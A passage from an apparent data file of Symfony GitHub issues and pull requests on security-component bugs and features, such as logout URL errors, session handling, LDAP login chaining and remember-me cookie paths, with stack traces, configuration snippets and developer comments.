@Security(""is_granted('GODLIKE') or (is_granted('ROLE_ADMIN') and is_granted('POST_SHOW', post))"")
```

> The @Security annotation is more flexible than @IsGranted https://symfony.com/doc/current/bundles/SensioFrameworkExtraBundle/annotations/security.html#security

edit: oh i see we allow expressions on $authorizationChecker->isGranted, translating to @/#IsGranted respectively

for the annotation/attribute would @/#Security be the better name actually?Hey, thanks for your report!
There has not been a lot of activity here for a while. Is this bug still relevant? Have you managed to find a workaround?Hello? This issue is about to be closed if nobody replies.Maybe we should deprecate features of `@Security` that rely on accessing the token directly, forcing to use `is_granted` inside the expression instead when wanting to do security checks.",no,"Security,Bug,Status: Needs Review,Keep open,"
symfony/symfony,1373277523,"security-http (LogoutUrlGenerator) error","### Symfony version(s) affected

4.4.44

### Description

Method generateLogoutUrl of LogoutUrlGenerator throws ""Call to a member function getBaseUrl() on null"" error.
It can be reproduced by generating error after authenticating as a user. Error is not present after logging out.
Similar issue is described on https://github.com/symfony/symfony/issues/27174
On Symfony 6.1 this problem does not occur on same setup.
Tested using PHP 8.1 (Ubuntu supplied) with built in server.

### How to reproduce

Install symfony/website-skeleton:""^4.4"" with dev environment
Add db based authentication
Login
Generate error


### Possible Solution

Checking for null request in LogoutUrlGenerator - there was previously supplied PR which fixes this problem:
https://github.com/symfony/symfony/pull/27175
It was rejected because problem was not reproduced (or should not exist).
But I think that in any case if called function can return null then it should be checked against null before calling its methods.

### Additional Context

Call to a member function getBaseUrl() on null
Exception Stack Trace 
Error
in vendor/symfony/security-http/Logout/LogoutUrlGenerator.php (line 110)
in vendor/symfony/security-http/Logout/LogoutUrlGenerator.php -> generateLogoutUrl (line 64)
in vendor/symfony/security-bundle/DataCollector/SecurityDataCollector.php -> getLogoutPath (line 136)
in vendor/symfony/http-kernel/Profiler/Profiler.php -> collect (line 178)
in vendor/symfony/http-kernel/EventListener/ProfilerListener.php -> collect (line 100)
in vendor/symfony/event-dispatcher/Debug/WrappedListener.php -> onKernelResponse (line 126)
in vendor/symfony/event-dispatcher/EventDispatcher.php -> __invoke (line 264)
in vendor/symfony/event-dispatcher/EventDispatcher.php -> doDispatch (line 239)
in vendor/symfony/event-dispatcher/EventDispatcher.php -> callListeners (line 73)
in vendor/symfony/event-dispatcher/Debug/TraceableEventDispatcher.php -> dispatch (line 168)
in vendor/symfony/http-kernel/HttpKernel.php -> dispatch (line 192)
in vendor/symfony/http-kernel/HttpKernel.php -> filterResponse (line 245)
in vendor/symfony/http-kernel/HttpKernel.php -> handleThrowable (line 115)
in vendor/symfony/http-kernel/EventListener/DebugHandlersListener.php -> terminateWithException (line 129)
in vendor/symfony/error-handler/ErrorHandler.php :: Symfony\Component\HttpKernel\EventListener\{closure} (line 601)
ErrorHandler->handleException()
","Can you create a small example application that allows to reproduce your issue?@xabbuh I have created minimal app to show issue:
https://github.com/krzyc/symfony-issue-47577
Commited with SQLite db - username: admin password: adminHi, fwiw we're getting this error too. I'm getting the exact same error trace as the OP whenever there is a 500 error. 

Some observations:
- It only happens on our development version, not on production. I presume this is because we're not displaying the error pages on production. They are reported correctly to our error log though.
- When this happens on our development version the original error is not logged. 
- It has been happening since we updated Symfony from 4.4.40 to 4.4.44.@specky-rum Yes, this error happens in process of collecting data for displaying actual error in dev (Web Profiler) environment. SecurityDataCollector tries to get logout URL, but generator throws error because of no request in RequestStack. So there are two problems: why there is no request in RequestStack at this point (some time ago this problem did not exist so maybe it was introduced in some latest versions of Symfony), and why generateLogoutUrl is not checking for null value which is legal return value for getCurrentRequest so it should be handled in my opinion - then SecurityDataCollector will silently fetch thrown Exception as described in comments (fail silently when the logout URL cannot be generated), but only Exceptions are catched, not errors.Can confirm this issue with symfony/symfony 4.4.45 too. I too am experiencing the problem whenever an exception occurs.Thanks to @krzyc's reproducer and git-bisect, I've been able to track this down to this change: https://github.com/symfony/symfony/pull/47358

This has been identified in another profiler related issue as well: https://github.com/symfony/symfony/issues/47405#issuecomment-1231572367Also having this issue with 6.1.5

6.1.3 works, thanks @wouterj 

```json
    ""extra"": {
        ""symfony"": {
            ""allow-contrib"": false,
            ""require"": ""<=6.1.3""
        }
    }
```Having this exception in 5.4.13

```
Error:
Call to a member function getBaseUrl() on null

  at /home/adcnx/app-vendor/symfony/security-http/Logout/LogoutUrlGenerator.php:104
  at Symfony\Component\Security\Http\Logout\LogoutUrlGenerator->generateLogoutUrl()
     (/home/adcnx/app-vendor/symfony/security-http/Logout/LogoutUrlGenerator.php:65)
  at Symfony\Component\Security\Http\Logout\LogoutUrlGenerator->getLogoutPath()
     (/home/adcnx/app-vendor/symfony/security-bundle/DataCollector/SecurityDataCollector.php:122)
  at Symfony\Bundle\SecurityBundle\DataCollector\SecurityDataCollector->collect()
     (/home/adcnx/app-vendor/symfony/http-kernel/Profiler/Profiler.php:161)
  at Symfony\Component\HttpKernel\Profiler\Profiler->collect()
     (/home/adcnx/app-vendor/symfony/http-kernel/EventListener/ProfilerListener.php:108)
  at Symfony\Component\HttpKernel\EventListener\ProfilerListener->onKernelResponse()
     (/home/adcnx/app-vendor/symfony/event-dispatcher/Debug/WrappedListener.php:117)
  at Symfony\Component\EventDispatcher\Debug\WrappedListener->__invoke()
     (/home/adcnx/app-vendor/symfony/event-dispatcher/EventDispatcher.php:230)
  at Symfony\Component\EventDispatcher\EventDispatcher->callListeners()
     (/home/adcnx/app-vendor/symfony/event-dispatcher/EventDispatcher.php:59)
  at Symfony\Component\EventDispatcher\EventDispatcher->dispatch()
     (/home/adcnx/app-vendor/symfony/event-dispatcher/Debug/TraceableEventDispatcher.php:154)
  at Symfony\Component\EventDispatcher\Debug\TraceableEventDispatcher->dispatch()
     (/home/adcnx/app-vendor/symfony/http-kernel/HttpKernel.php:186)
  at Symfony\Component\HttpKernel\HttpKernel->filterResponse()
     (/home/adcnx/app-vendor/symfony/http-kernel/HttpKernel.php:239)
  at Symfony\Component\HttpKernel\HttpKernel->handleThrowable()
     (/home/adcnx/app-vendor/symfony/http-kernel/HttpKernel.php:109)
  at Symfony\Component\HttpKernel\HttpKernel->terminateWithException()
     (/home/adcnx/app-vendor/symfony/http-kernel/EventListener/DebugHandlersListener.php:131)
  at Symfony\Component\HttpKernel\EventListener\DebugHandlersListener::Symfony\Component\HttpKernel\EventListener\{closure}()
     (/home/adcnx/app-vendor/symfony/error-handler/ErrorHandler.php:607)
  at Symfony\Component\ErrorHandler\ErrorHandler->handleException()                
```On 6.0.13

```
Error:
Call to a member function getBaseUrl() on null

  at /home/adcnx/app-vendor/symfony/security-http/Logout/LogoutUrlGenerator.php:97
  at Symfony\Component\Security\Http\Logout\LogoutUrlGenerator->generateLogoutUrl()
     (/home/adcnx/app-vendor/symfony/security-http/Logout/LogoutUrlGenerator.php:60)
  at Symfony\Component\Security\Http\Logout\LogoutUrlGenerator->getLogoutPath()
     (/home/adcnx/app-vendor/symfony/security-bundle/DataCollector/SecurityDataCollector.php:114)
  at Symfony\Bundle\SecurityBundle\DataCollector\SecurityDataCollector->collect()
     (/home/adcnx/app-vendor/symfony/http-kernel/Profiler/Profiler.php:151)
  at Symfony\Component\HttpKernel\Profiler\Profiler->collect()
     (/home/adcnx/app-vendor/symfony/http-kernel/EventListener/ProfilerListener.php:108)
  at Symfony\Component\HttpKernel\EventListener\ProfilerListener->onKernelResponse()
     (/home/adcnx/app-vendor/symfony/event-dispatcher/Debug/WrappedListener.php:111)
  at Symfony\Component\EventDispatcher\Debug\WrappedListener->__invoke()
     (/home/adcnx/app-vendor/symfony/event-dispatcher/EventDispatcher.php:230)
  at Symfony\Component\EventDispatcher\EventDispatcher->callListeners()
     (/home/adcnx/app-vendor/symfony/event-dispatcher/EventDispatcher.php:59)
  at Symfony\Component\EventDispatcher\EventDispatcher->dispatch()
     (/home/adcnx/app-vendor/symfony/event-dispatcher/Debug/TraceableEventDispatcher.php:152)
  at Symfony\Component\EventDispatcher\Debug\TraceableEventDispatcher->dispatch()
     (/home/adcnx/app-vendor/symfony/http-kernel/HttpKernel.php:186)
  at Symfony\Component\HttpKernel\HttpKernel->filterResponse()
     (/home/adcnx/app-vendor/symfony/http-kernel/HttpKernel.php:239)
  at Symfony\Component\HttpKernel\HttpKernel->handleThrowable()
     (/home/adcnx/app-vendor/symfony/http-kernel/HttpKernel.php:109)
  at Symfony\Component\HttpKernel\HttpKernel->terminateWithException()
     (/home/adcnx/app-vendor/symfony/http-kernel/EventListener/DebugHandlersListener.php:125)
  at Symfony\Component\HttpKernel\EventListener\DebugHandlersListener::Symfony\Component\HttpKernel\EventListener\{closure}()
     (/home/adcnx/app-vendor/symfony/error-handler/ErrorHandler.php:541)
  at Symfony\Component\ErrorHandler\ErrorHandler->handleException()
     (/home/adcnx/app-vendor/sentry/sentry/src/ErrorHandler.php:357)
  at Sentry\ErrorHandler->handleException()   
```For those on the 5.4.x branch, restricting to 5.4.12 works !

```yaml
  ""extra"": {
        ""symfony"": {
            ""allow-contrib"": false,
            ""require"": ""<=5.4.12""
        }
    }
```

(thanks @Padam87 for the idea)Great to see so many people have found this issue, it means we have many candidates to work on a fix :)

In the other issue, a more in-depth search has been done and the root cause has been found: https://github.com/symfony/symfony/issues/47405#issuecomment-1236095745 (the root cause being that there is no request while collecting data).

Anyone up for a PR to fix the issue?",no,"Security,Bug,Status: Needs Review,"
symfony/symfony,1404241644,"[Security] AuthenticationUtils: fix returning coalesced value of LastUsername","| Q             | A
| ------------- | ---
| Branch?       | 6.1
| Bug fix?      | yes
| New feature?  | no
| Deprecations? | no
| Tickets       | Fix #...
| License       | MIT
| Doc PR        | symfony/symfony-docs#...

In some sophisticated use cases, there might be conditions within which the Session object HAS LastUsername in the attribute bag but the value is null. I believe ""AuthenticationUtils"" is responsible to properly coalesce the retrieved value and turn it to a blank string if it's null. This PR responds to this issue.
",,yes,"Security,Bug,Status: Needs Review,"
symfony/symfony,1358613825,"Session started on several points at each request","### Symfony version(s) affected

6.1.3

### Description

If you are using the foshttpcachebundle, there is a problem regarding the cache header which occurs if a firewall is active.

The cache header is manipulated onResponseEvent in the AbstractSessionListener.
The AbstractSessionListener skips the autoCacheControl and cookie logic, if no session is started, which is correct in my opinion.

But the session is started by the firewall and authenticator logic on each request, cause ->hasSession() is not called with true as parameter and returns true as result. Even if the session is not started. That leads to getSession() calls which start the session.
The hasPreviousSession method of the Request class also calls hasSession() without true, which is wrong in my opinion.

So there are in the end some files which start the session:
- Symfony\Component\Security\Core\Authentication\Token\Storage\UsageTrackingTokenStorage
   When calling the request_stack->getSession() which also calls hasSession() without true
- Symfony\Component\Security\Http\Firewall\ContextListener
  Calls hasPreviousSession on Request and also hasSession() without using true

Maybe there are more classes which start the session unexpectedly.

### How to reproduce

As far as I can say, it should be enough to configure a firewall, add the foshttpcachebundle and try to configure the cache in a controller.

### Possible Solution

At least the hasSession()-calls listed in the description should be made with ""true"" as argument.

### Additional Context

_No response_","At least same problem than this one: https://github.com/symfony/symfony/issues/40540
But now the creation of a session isn't only annoying, It's breaking http caching headers.",no,"Security,Bug,HttpKernel,Status: Needs Review,"
symfony/symfony,1021223207,"Using isGranted() without a Session","**Description**
`isGranted()` assumes that it's checking against the currently logged in user. It would be great to be able to use something similar to check against another user or during times when there isn't a session (cronjobs/commands, message queue, etc.).

I would see this as a `userIsGranted()` function to make a distinction. There's cases we'd have to consider, such as if `IS_AUTHENTICATED_*` is used in conjunction with this method, as those are based on sessions. Return false, or throw a logic exception, etc.

Having this functionality would allow for removing the dependency on sessions entirely for services reducing the number of issues that come up during a project because some underlying function was session dependent.

I'm assuming we'd also want to create a new Token class to represent checking against a non-logged in user.

**Example**
Checking to see if you could assign another user to review an article:

```php
$security->userIsGranted($reviewer, ArticleVoter::REVIEW, $article);
```
","You can use the [AccessDecisionManager](https://github.com/symfony/symfony/blob/5.4/src/Symfony/Component/Security/Core/Authorization/AccessDecisionManagerInterface.php) Directly 


```php
$adm->decide(new PostAuthenticationToken($reviewer, '', $reviewer->getRoles()), [ArticleVoter::REVIEW], $article);
```

But indeed, a simpler way could be better 👍🏼 @natewiebe13 I had the same need,

I end up implementing my own `Security` service that provider `isGrantedFor()` methods, which calls `AccessDecisionManagerInterface` internally. I've also created a `is_granted_for()` twig function.

As consequence, I had to update all userland voters to rely on this method instead of the native one.

---

Limitation: if a voter depends on an external decision, it **MUST** propagate the given user by calling `isGrantedFor()`.

The native voters don't do that.

By the way, this didn't give me problems until now.@renanbr I don't understand the part with the voters. Voters should not really depend on the authenticated user because they are called with a token.Thank you for this suggestion.
There has not been a lot of activity here for a while. Would you still like to see this feature?Keep it open. I have started on this already, just need to get around to writing tests/documentation and then I can make a PR.",no,"Security,Feature,"
symfony/symfony,1190145805,"Improve a security related exception","### Description

Via [an issue in a third-party bundle](https://github.com/EasyCorp/EasyAdminBundle/issues/5143) I've seen that there's a security-related exception message that could be improved:

https://github.com/symfony/symfony/blob/f3ec7a0238c2503f1f653c23344660575160ebb6/src/Symfony/Component/Security/Http/Logout/LogoutUrlGenerator.php#L150

The exception message mentions which is the problem, but it's not very precise about the possible solution. A better exception message would mention the name of the firewall to configure and the exact config option name that should be added or updated.

Thanks!","If we were able to know the firewall name, we would not need the exception at all. Except in advanced setups, the provider key is precisely the firewall name.@stof I'm sorry but I don't fully understand your comment. Are you saying that we can't _(for some technical reasons)_ improve the exception message with more details ... or are you saying that we shouldn't do that? Thanks!The message is saying ""We can't figure out the firewall, so we can't find the logout listener to use"" (but with technical terms like ""provider key"").

We can improve the message to no longer use the outdated terms like ""provider key"", but we can't add the firewall name, because that's exactly what is missing here.

If I read the code correctly, 2 scenarios can produce this error:
1. Calling this code in a request that is not behind a firewall
2. Calling this code in a request that is behind a firewall, but that firewall has no logout defined

Maybe we can also add this to the exception message?",no,"Security,DX,"
symfony/symfony,932366037,"json_login_ldap in chain with json_login and new authenticator","**Symfony version(s) affected**: 5.3.2

**Description**
a combination of json_login_ldap and json_login will not work when the new authentication manager is enabled. They both
on their own work properly but not in combination. When new authentication manager is disabled they work properly together
in a chain.

**How to reproduce**
see attached repository with 4 different configuration cases to reproduce: 
https://github.com/oliverreese/symfony-security-ldap-login

**Possible Solution**
<!--- Optional: only if you have suggestions on a fix/reason for the bug -->

**Additional context**
<!-- Optional: any other context about the problem: log messages, screenshots, etc. -->
","cc @wouterj Hi, maybe it's another issue, but I encounter same thing with `form_login` and `form_login_ldap`.
When I disable the new authentication manager it's works.
Same problem describe [here](https://stackoverflow.com/questions/68131217/how-to-use-the-ldap-form-login-and-form-login-on-symfony-5-3-with-the-new-authen).[here](https://github.com/symfony/symfony/blob/5.4/src/Symfony/Bundle/SecurityBundle/DependencyInjection/Security/Factory/LdapFactoryTrait.php#L42) when the parent method is called, the base authenticator is replaced another with a different config. Parent method have hardcoded service idI can reproduce this issue aswell. I have the following firewall config:

```
main:
            lazy: true
            provider: app_user_provider
            user_checker: Some\Namespace\Infrastructure\Security\UnconfirmedUserChecker
            entry_point: 'form_login_ldap'
            form_login:
                login_path: login
                check_path: login
            form_login_ldap:
                service: Symfony\Component\Ldap\Ldap
                dn_string: 'MyOrganization\{username}'
                login_path: login
                check_path: ldap_login_check
            logout:
                path: logout
```

Then you can see that the wrong options are injected into the ""normal"" form login authenticator.

```
array (
  'username_parameter' => '_username',
  'password_parameter' => '_password',
  'check_path' => 'ldap_login_check',
  'post_only' => true,
  'form_only' => false,
  'enable_csrf' => false,
  'csrf_parameter' => '_csrf_token',
  'csrf_token_id' => 'authenticate',
  'login_path' => 'login',
  'use_forward' => false,
  'require_previous_session' => false,
)
```I also can produce the problem with SH 6.0.1: When using only the `form_login_ldap` authenticator, everything is working, however if I also add `form_login` (entry_point: 'form_login_ldap') the LDAP authenticator is not called. The problem is exactly in the place @diversantvlz linked. There is an [optimization ](https://github.com/B4rb4ross4/symfony/blob/6.1/src/Symfony/Bundle/SecurityBundle/DependencyInjection/Security/Factory/FormLoginFactory.php#L73)in place which shares the form_login config for all authenticators for all firewalls and that simply does not work and it breaks all the ldap decorators aswell.With symfony/security-bundle v6.0.3 the same error now occurs when disabling the new authentication manager.Same problem here chaining `form_login`and `form_login_ldap` with symfony/security-bundle v5.4.5 (LTS).

~~Somebody else describes the same issue here : https://stackoverflow.com/questions/71576619/symfony-6-security-login-from-two-providers-entity-and-ldap~~ => The post has been deleted...

For now I changed back for the old way to configure it disabling the `authenticator manager`...Does it take a big effort to solve this issue ?
I don’t realize how difficult it could be.
It seems a piece of code is shared for optimization, so is it ""just"" the upper linked part by @diversantvlz which needs to be reviewed ?Is there any news about fix this problem ?Talking for myself, the reasons for not looking into this ""naturally"" are that I don't suffer from this bug and it's about ldap which I don't use and for which I don't have the required setup to reproduce locally. If you can, please have a look into this so you can come up with a patch to propose in a PR.",no,"Security,Bug,Status: Needs Review,"
symfony/symfony,1071205090,"[Security] Allow RememberMeHandler to use a custom RememberMeDetails class","| Q             | A
| ------------- | ---
| Branch?       | 6.1
| Bug fix?      | no
| New feature?  | yes
| Deprecations? | yes
| Tickets       | Fix #44168
| License       | MIT
| Doc PR        | -

When writing a custom `RememberMeHandler` it is not possible to change anything about what is stored in the cookie or how. Not every implementation would for example need to include the user class or identifier in the cookie or may not even want to. Maybe you might want to add some other value to it, in which case concatenating it to the `$value` parameter would seem like more of a dirty workaround.

This PR adds support for the `RememberMeAuthenticator` and `RememberMeHandler` to use a different `RememberMeDetails` class when needed.

Currently I have not yet added an interface for `RememberMeDetails` to implement so it would be necessary to extend the class directly. This is because I'm thinking of making an RFC first for changing the `RememberMeDetails` implementation for the different available strategies.","Hey!

I see that this is your first PR. That is great! Welcome!

Symfony has a [contribution guide](https://symfony.com/doc/current/contributing/index.html) which I suggest you to read.

In short:
- Always add tests
- Keep backward compatibility (see https://symfony.com/bc).
- Bug fixes must be submitted against the lowest maintained branch where they apply (see https://symfony.com/releases)
- Features and deprecations must be submitted against the 6.1 branch.

Review the GitHub status checks of your pull request and try to solve the reported issues. If some tests are failing, try to see if they are failing because of this change.

When two Symfony core team members approve this change, it will be merged and you will become an official Symfony contributor!
If this PR is merged in a lower version branch, it will be merged up to all maintained branches within a few days.

I am going to sit back now and wait for the reviews.

Cheers!

CarsonbotI've added some tests. This includes 2 tests which test the deprecated code paths still work, but this does naturally result in self deprecation notices even when the tests succeed. Considering the PR checks seem to fail because of this it seems like the tests are not supposed to cause any of these.

As this is the first time I'm making a PR I'm not quite sure what the policy on tests like these are. Am I supposed to test these a different way, should deprecated code paths simply not be tested, or can these failures in this case be ignored?> As this is the first time I'm making a PR I'm not quite sure what the policy on tests like these are. Am I supposed to test these a different way, should deprecated code paths simply not be tested, or can these failures in this case be ignored?

These tests have to be in the legacy group (deprecations in legacy tests are ignored):

```
/**
 * @group legacy
 */
public function testSomeDeprecatedBehavior()
{
}
```

In these legacy tests, you can also use the `ExpectDeprecationTrait` to test that the deprecations are triggered correctly ([docs](https://symfony.com/doc/current/components/phpunit_bridge#log-deprecations)).I rebased the PR to 6.2 and solved the resulting merge conflicts. There are some failing tests, but it seems like those are unrelated to the changes of this PR.

No new feedback has come since the last feedback was implemented. Is there anything else needed from my side to get this merged?",yes,"Security,Feature,Status: Needs Review,Deprecation,"
symfony/symfony,1339637395,"[Security] login_throttling: Allow configuring the multiplier ""5""","### Description

I'm talking about the number 5 in this sentence at https://symfony.com/doc/current/security.html#limiting-login-attempts

> Login attempts are limited on [...] `5 * max_attempts` failed requests for IP address.

Reason: When using magic links to login, the distinction between ""same username"" and ""different username"" just doesn't make sense.
Example: When setting `max_attempts` to 1, and a user clicks on the same invalid link twice, login_throttling kicks in, and I'm displaying ""You're blocked."" However, what happens when the user now clicks on a valid link? => He's logged in! Cause this counts as a different username.

So in order to allow disabling the second limit completely, I suggest to make the number configurable (i.e. in this case set it to 1).

Since it's probably difficult to find a name for this option (""max_attempts_multiplier_for_different_username""?), it's maybe better to drop the idea of multiplication completely, and just allow setting the desired number of ""max_attempts_different_username"" directly?


### Example

_No response_",,no,"Security,Feature,RateLimiter,"
symfony/symfony,1192125521,"CheckLdapCredentialsListener doesn't work when no UserPassportInterface is given","### Symfony version(s) affected

5.4

### Description

Line 53 has an error:

`if (!$passport instanceof UserPassportInterface || !$passport->hasBadge(PasswordCredentials::class))`

if the passport is not of the deprecated class it will succeed and trigger the exception

it should be:
`if (!($passport instanceof UserPassportInterface) && !$passport->hasBadge(PasswordCredentials::class))`


It was hard to debug because the error message is very confusing

### How to reproduce

Creating a custom authenticator.

### Possible Solution

replace with `if (!($passport instanceof UserPassportInterface) && !$passport->hasBadge(PasswordCredentials::class))`
or just remove `!$passport instanceof UserPassportInterface ||`

### Additional Context

_No response_","@devkral Hi, It does not seems like a bug to me rather its an expected feature.

**TLDR;**
`CheckLdapCredentialsListener::onCheckPassport` is expected to always throw `LogicException` if  a `PasswordCredentials` badge is missing from `passport` instance not just for deprecated `UserPassportInterface` passport instance.
Ref: https://github.com/symfony/symfony/blob/5.4/src/Symfony/Component/Ldap/Security/CheckLdapCredentialsListener.php#L53

**Details;**
It is expected to throw LogicException(`LDAP authentication requires a passport containing a user and password credentia...` if the `passport` instance does not have `PasswordCredentials` badge.

what matters is that you need to provide a `PasswordCredentials` badge when instantiating `passport` class either as second argument or as a badge.
https://github.com/symfony/symfony/blob/5.4/src/Symfony/Component/Security/Http/Authenticator/Passport/Passport.php#L36

You can check using following test case in `CheckLdapCredentialsListenerTest.php`
```
public function testMissingPasswordCredentialsBadge()
{
    $this->expectException(\LogicException::class);
    $this->expectExceptionMessage('LDAP authentication requires a passport containing a user and password credentials, authenticator ""'.TestAuthenticator::class.'"" does not fulfill these requirements.');

    $credentials = new CustomCredentials(function () {
        return true;
    }, ['something' => 'foo']);

    $badge = new LdapBadge('app.ldap');
    $passport = new Passport(new UserBadge('test'), $credentials, [$badge]);

    $listener = $this->createListener();
    $listener->onCheckPassport(new CheckPassportEvent(new TestAuthenticator(), $passport));
}
```ok, then the check for the old UserPassportInterface should be removed (like it is done in symfony 6).
If the badge does not implement UserPassportInterface, it failsPlease submit a pull requests with the fix and a failing test case. Thanks! :)",no,"Security,Bug,Status: Needs Review,"
symfony/symfony,1107874227,"[Security] access_control not working with POST request","### Symfony version(s) affected

5.4

### Description

Hej,
I've got an /api route which should not be bothered by my authenticator via access_control rules.
These look like the following:
```
    access_control:
        - { path: ^/login, roles: PUBLIC_ACCESS }
        - { path: ^/api, roles: PUBLIC_ACCESS }
        - { path: ^/, roles: ROLE_USER }
```
If I send a GET request to /api/test everything works as expected, but sending a POST request results in a redirect to the login page.  

I've tried to enhance the rules with the methods parameter, but that changed nothing.
```
        - { path: ^/api, roles: PUBLIC_ACCESS, methods: [GET, POST] }
```
Is this the intended behavior?
Best Regards
Chris

### How to reproduce

I've created an reproducer project:
https://github.com/creiner/acltest

GET /api/test - works
POST /api/test - redirects to login

Test with restricted methods annotation
GET /api/test2 - works
POST /api/test2 - redirects to login


### Possible Solution

_No response_

### Additional Context

_No response_","A small follow up, Michael found a solution and posted it in the symfony slack:
https://github.com/mbtreetime/acltest/blob/7061b534017e2434d0be42542b5a5bc64c3dc71c/config/packages/security.yaml#L16-18
Enabling the authentication manager and adding the guard as custom_authenticators works.

But in my opinion the bug still exists/is intended by design so we should add a comment in the docs?
I think that the problem is at this row https://github.com/symfony/security-http/blob/5.4/Firewall/AccessListener.php#L76.

It should return `false` instead of `null` because then https://github.com/symfony/security-http/blob/5.4/Firewall/AbstractListener.php#L25 will skip authentication. I tested it locally and changing `null` to `false` did the trick.@nicolas-grekas is there a chance to review this issue? I may prepare the PR if my proposed solution is viable. It seems like a quite important security issue when public POST requests are still checked by the authenticator. This broke our incoming hooks from 3rd party services.

Hey, thanks for your report!
There has not been a lot of activity here for a while. Is this bug still relevant? Have you managed to find a workaround?",no,"Security,Bug,Status: Needs Review,Stalled,"
symfony/symfony,1065404490,"REMEMBER_ME cookie has path '/' by default even when application lives under directory","### Symfony version(s) affected

5.4.0

### Description

Similar to issue 44318, the ""Remember Me"" feature also doesn't work properly out of the box when the application ""lives under a directory"", e.g. `https://mydomain.com/some/path`.

In `security.yaml`:
```
security:
    # ...

    firewalls:
        # ...
        main:
            #...
            remember_me:
                secret:   '%kernel.secret%'
                lifetime: 604800
                # <<<<<<<<<<<<<<<<<<<<<<<<NOTE I have NOT explicitly set a value for 'path'
```

I know I can set `path: '/some/path'` under `remember_me:` but I shouldn't need to do that like I don't need to have a configuration parameter with the domain name. Having the path of the cookie be the same as the app's root folder path should be the default.

Note that having `/` as the path regardless of the app's root path (i.e. the current behavior) is also an option that one should be able to set if they want to (not that I can immediately think of a use case but that should never be a reason to assume there isn't one). So, I do _not_ suggest that the value '/' mean ""the root path of the application"" (because then you'd have to define a special value other than ""/"" that would mean ""litelarry '/'"" which would be counterintuitive af). Rather, I suggest that a special value like `null` or `false` or something is taken to mean the root path of the application, and that that value becomes the default.

I don't know whether this is a more general problem with cookies or if this is specific to the remember_me cookie.
Actually, I see the `PHPSESSID` cookie shares the same issue.




### How to reproduce

- deploy the application under a directory
- enable remember_me
- log in with remember_me
- look at the cookie path

### Possible Solution

_No response_

### Additional Context

_No response_","> I don't know whether this is a more general problem with cookies

Apparently it is. At least, the session id cookie has the same issue.

Hey, thanks for your report!
There has not been a lot of activity here for a while. Is this bug still relevant? Have you managed to find a workaround?> Is this bug still relevant? 

I don't know. Did anyone do something to address it? Did anyone re-test it and were unable to reproduce?
I haven't been working on any of my Symfony projects for a while, so I haven't had a chance to do a quick test.

> Have you managed to find a workaround?

No. I mean, the workaround is to set `remember_me.path` (or hopefully some other more general configuration setting that affects all cookies), but the point of the issue is that you shouldn't have to do that, this should work out of the box.",no,"Security,Bug,Status: Needs Review,"
symfony/symfony,1401941536,"InvalidArgumentException: Class """" used for service ""security.listener.session.main"" cannot be found","### Symfony version(s) affected

5.4.13

### Description

I just updated libraries due to php upgrade from 7.4 to 8.1.
The following exception occurs and it seems to be related to the SecurityBundle:

```
PHP Fatal error:  Uncaught Symfony\Component\DependencyInjection\Exception\InvalidArgumentException: Class """" used for service ""security.listener.session.main"" cannot be found. in /shared/httpd/myapp/vendor/symfony/event-dispatcher/DependencyInjection/RegisterListenersPass.php:122
Stack trace:
#0 /shared/httpd/myapp/vendor/symfony/dependency-injection/Compiler/Compiler.php(82): Symfony\Component\EventDispatcher\DependencyInjection\RegisterListenersPass->process(Object(Symfony\Component\DependencyInjection\ContainerBuilder))
#1 /shared/httpd/myapp/vendor/symfony/dependency-injection/ContainerBuilder.php(757): Symfony\Component\DependencyInjection\Compiler\Compiler->compile(Object(Symfony\Component\DependencyInjection\ContainerBuilder))
#2 /shared/httpd/myapp/vendor/symfony/http-kernel/Kernel.php(546): Symfony\Component\DependencyInjection\ContainerBuilder->compile()
#3 /shared/httpd/myapp/vendor/symfony/http-kernel/Kernel.php(787): Symfony\Component\HttpKernel\Kernel->initializeContainer()
#4 /shared/httpd/myapp/vendor/symfony/http-kernel/Kernel.php(190): Symfony\Component\HttpKernel\Kernel->preBoot()
#5 /shared/httpd/myapp/web/app.php(20): Symfony\Component\HttpKernel\Kernel->handle(Object(Symfony\Component\HttpFoundation\Request))
#6 {main}
  thrown in /shared/httpd/myapp/vendor/symfony/event-dispatcher/DependencyInjection/RegisterListenersPass.php on line 122
[08-Oct-2022 14:34:52 Europe/Rome] PHP Fatal error:  Uncaught Symfony\Component\DependencyInjection\Exception\InvalidArgumentException: Class """" used for service ""security.listener.session.main"" cannot be found. in /shared/httpd/myapp/vendor/symfony/event-dispatcher/DependencyInjection/RegisterListenersPass.php:122
Stack trace:
#0 /shared/httpd/myapp/vendor/symfony/dependency-injection/Compiler/Compiler.php(82): Symfony\Component\EventDispatcher\DependencyInjection\RegisterListenersPass->process(Object(Symfony\Component\DependencyInjection\ContainerBuilder))
#1 /shared/httpd/myapp/vendor/symfony/dependency-injection/ContainerBuilder.php(757): Symfony\Component\DependencyInjection\Compiler\Compiler->compile(Object(Symfony\Component\DependencyInjection\ContainerBuilder))
#2 /shared/httpd/myapp/vendor/symfony/http-kernel/Kernel.php(546): Symfony\Component\DependencyInjection\ContainerBuilder->compile()
#3 /shared/httpd/myapp/vendor/symfony/http-kernel/Kernel.php(787): Symfony\Component\HttpKernel\Kernel->initializeContainer()
#4 /shared/httpd/myapp/vendor/symfony/http-kernel/Kernel.php(190): Symfony\Component\HttpKernel\Kernel->preBoot()
#5 /shared/httpd/myapp/web/app.php(20): Symfony\Component\HttpKernel\Kernel->handle(Object(Symfony\Component\HttpFoundation\Request))
#6 {main}
  thrown in /shared/httpd/myapp/vendor/symfony/event-dispatcher/DependencyInjection/RegisterListenersPass.php on line 122
```
These are the versions of the installed libraries:
symfony/security-bundle            v6.1.3 
symfony/security-core                v6.1.5 
symfony/security-csrf                 v6.1.0 
symfony/security-http                 v6.0.13

Does someone know the reason? I'm struggling trying to found a solution.
Thank. you in advance

### How to reproduce

symfony/framework-bundle        v5.4.13
symfony/security-bundle            v6.1.3 
symfony/security-core                v6.1.5 
symfony/security-csrf                 v6.1.0 
symfony/security-http                 v6.0.13

### Possible Solution

_No response_

### Additional Context

_No response_","Your report does not provide enough information to make us able to reproduce the issue. Please create a reproducer as described in https://symfony.com/doc/current/contributing/code/reproducer.html#reproducing-complex-bugs",no,"Security,Bug,Status: Needs Review,Status: Waiting feedback,"
symfony/symfony,1231455733,"BackedEnum support for voters","### Description

See - https://github.com/sensiolabs/SensioFrameworkExtraBundle/issues/772

### Example

_No response_",,no,"Security,Feature,"
symfony/symfony,1345900185,"[Security] [Authenticator] X509 authenticator should can use CN as UserIdentifier","### Description

Acutally in the `Symfony\Component\Security\Http\Authenticator\X509Authenticator`, the `userIdentifier` is always the `emailAdress` part of the TLS subject:
